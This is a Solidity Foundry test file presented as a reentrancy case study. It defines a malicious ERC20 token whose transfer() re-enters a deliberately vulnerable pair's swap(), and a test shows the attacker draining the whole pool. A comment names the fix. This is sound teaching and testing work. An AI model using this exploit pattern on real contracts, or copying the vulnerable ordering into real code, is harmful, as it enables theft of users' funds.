/**
 * @notice REENTRANCY CASE STUDY
 * VulnerablePair.sol lacks the ReentrancyGuard modifier and updates the state (reserve0)
 * AFTER the external token transfer, directly violating the Checks-Effects-Interactions pattern.
 * Attack: Malicious token overrides transfer() to re-enter swap() before reserves are updated.
 * Fix: The real Pair.sol implements OpenZeppelin's ReentrancyGuard and updates reserves BEFORE transfers.
 */
pragma solidity ^0.8.24;

import { Test } from "forge-std/Test.sol";
import { VulnerablePair } from "../../src/security/VulnerablePair.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MaliciousToken is ERC20 {
    address public pair;
    bool public attacking;

    constructor() ERC20("Malicious", "MAL") { }

    function setPair(address _pair) external {
        pair = _pair;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        super.transfer(to, amount);
        // Исправлено: теперь украденные средства идут на адрес `to`
        // (атакующему)
        if (msg.sender == pair && !attacking) {
            attacking = true;
            VulnerablePair(pair).swap(amount, to);
        }
        return true;
    }
}

contract ReentrancyAttackTest is Test {
    VulnerablePair public vulnerable;
    MaliciousToken public token;
    address public attacker = address(0xBAD);

    function setUp() public {
        token = new MaliciousToken();
        vulnerable = new VulnerablePair(address(token));
        token.setPair(address(vulnerable));

        token.mint(address(vulnerable), 1000 ether);
    }

    function test_vulnerable_canBeDrained() public {
        vm.startPrank(attacker);
        vulnerable.swap(500 ether, attacker);
        vm.stopPrank();

        assertEq(token.balanceOf(attacker), 1000 ether);
        assertEq(token.balanceOf(address(vulnerable)), 0);
    }

    /// @dev Cover VulnerablePair.deposit() to round out case-study coverage.
    ///      Demonstrates that the unsafe pattern accepts deposits prior to attack.
    function test_vulnerable_depositAccountsReserves() public {
        MaliciousToken benign = new MaliciousToken();
        VulnerablePair pool = new VulnerablePair(address(benign));
        benign.mint(attacker, 100 ether);

        vm.startPrank(attacker);
        benign.approve(address(pool), 100 ether);
        pool.deposit(100 ether);
        vm.stopPrank();

        assertEq(pool.reserve0(), 100 ether);
        assertEq(benign.balanceOf(address(pool)), 100 ether);
    }
}
